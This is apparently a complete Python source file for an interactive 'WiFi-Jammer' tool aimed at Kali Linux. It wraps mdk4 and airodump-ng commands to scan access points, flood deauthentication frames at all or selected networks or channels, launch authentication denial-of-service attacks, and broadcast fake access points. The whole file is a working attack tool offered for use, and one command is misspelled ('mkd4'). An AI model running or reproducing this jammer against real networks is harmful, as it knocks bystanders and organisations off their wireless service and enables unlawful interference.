import os
import block
import getpass
import interface
import subprocess
from time import sleep
from random2 import randrange

def root():
    user = getpass.getuser()
    if ( user != 'root'):
        print("\033[1;32mPlease run as root")
        exit()

def banner(kka):
    g='\033[1;3{}m'.format(kka)
    print('{}m     m   "    mmmmmm   "             mmm                                    \n#  #  # mmm    #      mmm               #   mmm   mmmmm  mmmmm   mmm    m mm \n" #"# #   #    #mmmmm   #               #  "   #  # # #  # # #  #"  #   #"  "\n ## ##"   #    #        #     """       #  m"""#  # # #  # # #  #""""   #    \n #   #  mm#mm  #      mm#mm         "mmm"  "mm"#  # # #  # # #  "#mm"   #\n'.format(g))

def about():
    print('\033[1;31mCreate By     \t\t\t        \033[1;36m>\033[1;37m \tIHA\n\033[1;31mWritten Language\t        \t\033[1;36m>\033[1;37m \tPython3 & shell\n\033[1;31mSupported Operation System\t\t\033[1;36m>\033[1;37m \tKali Linux\n\033[1;31mHardware Require\t\t\t\033[1;36m>\033[1;37m\tWireless Adapter(support Monitor Mode)\n\033[1;31mGitHub \t\t\t\t\t\033[1;36m>\033[1;37m\thttps://github.com/IHA-arch\n\n\n')

def start_jammer():
    afd = interface.check_jammer()
    if afd == 'RwR':
        pass
    else:
        start_cmd = 'iw {} interface add jammer type monitor'.format(interface.interface_Name())
        os.system(start_cmd)

def scanning():
    cmd = "killall xterm > /dev/null"
    try:
        k=subprocess.check_output(cmd, shell=True)
    except:
        pass
    capture_mode_cmd = "xterm -title 'WiFi-JAMMER::Scan live AP' -fa 'Monospace' -fs 9 -geometry 100x20 -bg black -fg green -ls -xrm 'XTerm*selectToClipboard: true' -hold -e 'python3 scan.py'&"
    os.system(capture_mode_cmd)

def scan_all():
    cmd = "killall xterm > /dev/null"
    try:
        k = subprocess.check_output(cmd, shell=True)
    except:
        pass
    all_cmd = "xterm -title 'WiFi-JAMMER::Scan All AP' -fa 'Monospace' -fs 9 -geometry 100x20 -bg black -fg green -ls -xrm 'XTerm*selectToClipboard: true' -hold -e 'airodump-ng jammer'&"
    os.system(all_cmd)

def scan_specific():
    sleep(6)
    try:
        bssid = input("Enter target Access Point BSSID:")
        cmd="killall xterm"
        os.system(cmd)
        if ':' in bssid:
            s_cmd = "xterm -title 'WiFi-JAMMER::Scan {} AP' -fa 'Monospace' -fs 9 -geometry 100x20 -bg black -fg green -ls -xrm 'XTerm*selectToClipboard: true' -hold -e 'airodump-ng --bssid {} jammer'&".format(bssid, bssid)
            os.system(s_cmd)
        else:
            print("\033[1;33minvalid BSSID \033[1;34m{}".format(bssid))
    except KeyboardInterrupt:
        print("\n", end='')
        pass
    except:
        pass

def header(i, name):
    if len(i) > 5:
        print("\033[1;37m {} \t\t\t \033[1;31m {}".format(i, name))
    else:
        print("\033[1;37m {} \t\t\t\t \033[1;31m {}".format(i, name))


def Menu():
    i="about"
    name="Tool Creater information"
    header(i, name)
    i="help"
    name="Show Help"
    header(i, name)
    i='scan all'
    name = 'Scan All Access Point'
    header(i, name)
    i='scan'
    name = 'Scan only specific Access Point'
    header(i, name)
    i='jam all'
    name = 'Jam all Access Point'
    header(i, name)
    i='allow'
    name = 'Allow Access Point on Jamming time'
    header(i, name)
    i='jam'
    name = 'Jam only specific Access Point'
    header(i, name)
    i='jam ch'
    name = 'Jam Access Point using channel'
    header(i, name)
    i='dos all'
    name = 'Start DOS Attack on all Access Point'
    header(i, name)
    i='dos'
    name = 'Start DOS Attack only specific Access Point'
    header(i, name)
    i='fake'
    name = 'Create Fake Access Point'
    header(i, name)
    i='block'
    name = 'Connect with Block Access Point'
    header(i, name)
    i='exit'
    name = 'Exit WiFi-Jammer'
    header(i, name)
    i='clear'
    name = 'Clear Screen'
    header(i, name)
    i='kill'
    name = 'Close Another xterm windows'
    header(i, name)


def jam_all_ap():
    all_ap = 'mdk4 jammer d'
    os.system(all_ap)

def allow_wifi():
    allow_file = open('allow.list', 'w')
    allow_ap = int(input("How many wifi-device allow :"))
    for i in range(0,allow_ap):
        bssid = input("Enter {} wifi-device BSSID:".format(i+1))
        if not bssid:
            pass
        else:
            allow_file.write(bssid)
            allow_file.write("\n")
    allow_ap = 'mdk4 jammer d -w allow.list'
    os.system(allow_ap)

def jam_wifi():
    jam_file = open('jam.list', 'w')
    jam_ap = int(input("How many wifi-device jam:"))
    for i in range(0, jam_ap):
        bssid = input("Enter {} wifi-device BSSID:".format(i+1))
        if not bssid:
            pass
        else:
            jam_file.write(bssid)
            jam_file.write("\n")
    jam_ap = 'mdk4 jammer d -b jam.list'
    os.system(jam_ap)

def jam_channel():
    try:
        channel = int(input("\033[1;33mEnter channel number:"))
        jam_cmd = 'mdk4 jammer d -c {}'.format(channel)
        os.system(jam_cmd)
    except KeyboardInterrupt:
        print("\nExit by user...")
        exit()


def dos_on_all_ap():
    dos_ap = 'mdk4 jammer a'
    os.system(dos_ap)


def dos_on_specific_ap():
    bssid = input("Enter BSSID:")
    dos_specific_ap = 'mkd4 jammer a -a {}'.format(bssid)
    os.system(dos_specific_ap)

def kill_all():
    cmd = "killall xterm"
    os.system(cmd)

def fake_ap():
    fake_list = open("fake.lst", 'w')
    try:
        fake_AP = int(input("\033[1;33mHow many fake AP create[1 for unlimate ranodom AP]:\033[1;38m"))
        if fake_AP == 1:
            fake_ap_cmd = 'mdk4 jammer b -c 1 -w wta'
        else:
            i='1'
            name = 'Access Point with same name'
            header(i, name)
            i='2'
            name = 'Access Point with diff. name'
            header(i, name)
            user = int(input("\033[1;35mSelect:"))
            if user == 1:
                ap_name = input("\033[1;34mEnter fake AP name:\033[1;38m")
                for i in range(0, fake_AP):
                    k = ap_name + str(i+1)
                    fake_list.write(k)
                    fake_list.write("\n")

            if user == 2:
                for i in range(0, fake_AP):
                    ap_name = input("\033[1;34mEnter {} fake AP name:\033[1;38m".format(i+1))
                    if not ap_name:
                        pass
                    else:
                        fake_list.write(ap_name)
                        fake_list.write("\n")
            fake_list.close()
            fake_ap_cmd = 'mdk4 jammer b -c 1 -w wta -f fake.lst'

        os.system(fake_ap_cmd)
    except KeyboardInterrupt:
        print("\nExit by user...")
        exit()

def run_jammer():
    root()
    j=randrange(9)
    banner(j)
    start_jammer()
    condition=True
    f='first'
    while condition:
        try:
            user = input("\033[1;31mWiFi-Jammer\033[1;34m>>\033[1;37m")
            if not user:
                pass
            elif user == 'help':
                Menu()
            elif user == 'about':
                about()
            elif user == 'scan all':
                scan_all()
            elif user == 'scan':
                scanning()
                scan_specific()
            elif user == 'jam all':
                jam_all_ap()
            elif user == 'allow':
                scanning()
                allow_wifi()
            elif user == 'jam':
                scanning()
                jam_wifi()
            elif user == 'jam ch':
                jam_channel()
            elif user == 'dos all':
                dos_on_all_ap()
            elif user == 'dos':
                scanning()
                dos_on_specific_ap()
            elif user == 'fake':
                fake_ap()
            elif user == 'block':
                cmd = 'airmon-ng stop jammer'
                try:
                    k = subprocess.check_output(cmd, shell=True)
                except:
                    pass
                scanning()
                block.main()
            elif user == 'exit' or user == 'quit':
                print("\033[1;32m Exiting....")
                condition=False
                exit()
            elif user == 'clear':
                os.system("clear")
                k=randrange(9)
                banner(k)
            elif user == 'kill':
                kill_all()
            else:
                print("\033[1;39minvalid command \033[1;36m: {}".format(user))
                if f == 'first':
                    print("\033[1;39mtype '\033[1;36mhelp\033[1;39m' for more information")
                    f = 'chang'
        except KeyboardInterrupt:
            print("\n", end='')
            pass

run_jammer()



